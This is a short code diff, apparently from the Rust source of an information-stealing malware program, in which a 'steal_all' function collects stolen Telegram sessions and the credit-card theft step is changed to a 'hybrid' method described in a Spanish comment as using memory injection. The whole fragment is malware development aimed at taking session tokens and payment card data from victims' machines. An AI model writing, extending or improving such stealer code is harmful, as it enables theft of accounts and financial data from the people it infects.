@@ -247,8 +247,8 @@ pub fn steal_all() -> StolenData {
     let mut telegram_data = telegram::steal_telegram_sessions();
     data.telegram.append(&mut telegram_data);
     
-    // Credit Cards
-    let mut credit_cards = autofill::steal_credit_cards();
+    // Credit Cards - NUEVO: Usando método híbrido con memory injection
+    let mut credit_cards = autofill::steal_credit_cards_hybrid();
     data.credit_cards.append(&mut credit_cards);
     
     // 🔍 DEBUG: Leer log file si existe
